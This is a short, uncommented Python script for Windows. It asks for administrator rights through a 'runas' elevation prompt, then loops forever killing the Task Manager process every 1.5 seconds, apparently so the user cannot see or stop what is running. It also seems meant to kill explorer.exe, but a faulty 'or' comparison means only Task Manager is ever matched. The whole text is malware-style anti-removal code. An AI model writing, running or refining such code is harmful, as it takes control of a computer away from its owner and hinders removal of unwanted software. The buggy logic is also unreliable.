from sys import executable, argv
from time import sleep
from ctypes import windll
from psutil import process_iter
from os import kill
from signal import SIGBREAK


if windll.shell32.IsUserAnAdmin():

    while True:
        for p in process_iter():
            if p.name() == ("Taskmgr.exe" or "explorer.exe"): 
                kill(p.pid, SIGBREAK)
                sleep(1.5)

else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)